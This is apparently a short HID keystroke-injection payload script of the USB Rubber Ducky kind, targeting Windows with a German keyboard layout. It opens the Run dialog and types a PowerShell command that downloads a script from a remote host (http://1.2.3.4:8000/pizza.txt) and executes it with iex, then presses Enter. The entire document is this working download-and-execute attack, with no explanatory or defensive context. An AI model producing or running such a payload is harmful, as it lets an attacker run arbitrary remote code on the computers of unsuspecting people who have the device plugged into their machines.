language="de";
layout(language); //set keyboard layout according to the language variable (if this command is ommited, the current layout is used)
typingSpeed(10,0); // type as fast as possible
press("GUI r");
delay(500);
type("powershell iex(new-object net.webclient).downloadstring('http://1.2.3.4:8000/pizza.txt')");
delay(500);
press("ENTER")
